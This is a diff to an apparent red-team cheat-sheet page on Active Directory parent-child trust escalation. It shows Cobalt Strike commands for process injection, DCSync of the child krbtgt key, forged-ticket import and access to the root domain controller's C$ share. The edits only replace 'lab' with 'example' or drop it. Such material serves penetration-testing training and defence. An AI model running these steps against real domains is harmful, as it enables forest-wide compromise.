@@ -1,6 +1,6 @@
 ---
 title: "Parent-Child Trusts · SID History and Tickets"
-description: "Enumerate an intra-forest trust, distinguish child and root SIDs, and follow the lab Golden Ticket flow and the Diamond Ticket alternative."
+description: "Enumerate an intra-forest trust, distinguish child and root SIDs, and follow the example Golden Ticket flow and the Diamond Ticket alternative."
 category: "Forest & Domain Trusts"
 tools: ["Cobalt Strike", "Rubeus", "PowerShell"]
 updated: "2026-11-11"
@@ -51,13 +51,13 @@ ldapsearch (objectClass=domain) --hostname lon-dc-1.contoso.com --dn DC=contoso,
 
 ## 3. Child-domain replication context
 
-The lab starts from `DUB-WKSTN-3` and identifies a process running with child-domain administrative access. If that context is already available, use it directly. Otherwise the lab obtains a new Beacon through process injection:
+The example starts from `DUB-WKSTN-3` and identifies a process running with child-domain administrative access. If that context is already available, use it directly. Otherwise the example obtains a new Beacon through process injection:
 
 ```shell
 # In the original elevated Beacon, identify the current process and owner
 ps
 
-# Optional lab context transition: use the real PID and configured listener
+# Optional context transition: use the real PID and configured listener
 inject <CHILD_DA_PID> x64 http
 # Select the NEW Beacon when it connects; do not repeat injection as a separate step
 
@@ -121,7 +121,7 @@ run klist
 # Expected TGT: krbtgt/dublin.contoso.com
 
 ls \\lon-dc-1.contoso.com\c$
-# The lab validates access to this root-domain administrative share
+# The example validates access to this root-domain administrative share
 
 # Only purge the selected test session
 kerberos_ticket_purge
@@ -151,7 +151,7 @@ TRUST AND IDENTIFIERS
 
 CHILD REPLICATION CONTEXT
 [ ] getuid → confirm the context with child-domain replication rights
-[ ] Optional lab transition: ps, then inject <CHILD_DA_PID> x64 <LISTENER>; select the new Beacon
+[ ] Optional context transition: ps, then inject <CHILD_DA_PID> x64 <LISTENER>; select the new Beacon
 [ ] dcsync <CHILD_DOMAIN> <CHILD_NETBIOS>\krbtgt
 [ ] Retain the child krbtgt AES256 key; do not substitute a trust key
 
@@ -165,7 +165,7 @@ IMPORT AND VERIFY
 [ ] make_token <CHILD_NETBIOS>\Administrator FakePass
 [ ] kerberos_ticket_use C:\path\<ACTUAL_TICKET_FILE>
 [ ] run klist → confirm the child-domain client and TGT
-[ ] ls \\<ROOT_DC_FQDN>\c$ → verify the lab's target resource
+[ ] ls \\<ROOT_DC_FQDN>\c$ → verify the target resource
 [ ] kerberos_ticket_purge → only the selected test cache
 [ ] rev2self
 ```
